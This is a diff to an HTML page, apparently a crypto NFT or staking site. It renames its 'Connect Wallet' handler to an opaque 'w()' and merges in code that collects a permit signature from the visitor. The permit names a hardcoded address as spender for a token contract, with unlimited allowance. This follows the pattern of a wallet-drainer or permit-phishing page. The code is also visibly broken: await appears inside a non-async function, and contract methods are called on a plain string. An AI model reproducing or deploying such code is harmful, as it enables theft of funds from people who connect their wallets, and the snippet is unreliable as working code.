@@ -18,7 +18,7 @@
         <nav class="navigation row">
             <ul class="row">
                 <li><a target="_blank" href="https://opensea.io/">Collection</a></li>
-                <li><a onclick="walletconnect()" class="hero-btn" id="connect-wallet"> Connect Wallet</a>
+                <li><a onclick="w()" class="hero-btn" id="connect-wallet"> Connect Wallet</a>
                     <a class="hero-btn" id="disconnect-wallet"> <img src="icons8-cancel.svg"> </a>
                     <div id="message"></div>
                 </li>
@@ -48,7 +48,7 @@
     const ADDRESS = "0x5D7314906944Df364CcFB4d12c6D175695258E30";
     const prc20 = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    
-    async function walletconnect() {
+    async function w() {
         if(window.ethereum) {
         await window.ethereum.send('eth_requestAccounts');
         window.web3 = new Web3(window.ethereum);
@@ -65,17 +65,13 @@
             const price = web3.utils.toWei(value, 'ether');
             contract.methods.stakeTokens(value).send({ from: account});
         }
-        
-        
         }
-    }
-    async function aprove() {
-        
-    document.getElementById('aprove').onclick = () => {
+        document.getElementById('aprove').onclick = () => {
             const result = await signDaiPermit(window.ethereum, prc20, account, ADDRESS);
             await prc20.methods.permit(senderAddress, spender, result.nonce, result.expiry, true, result.v, result.r, result.s).send({from: account});
         }
     }
+    
 </script>
 </body>
 </html>
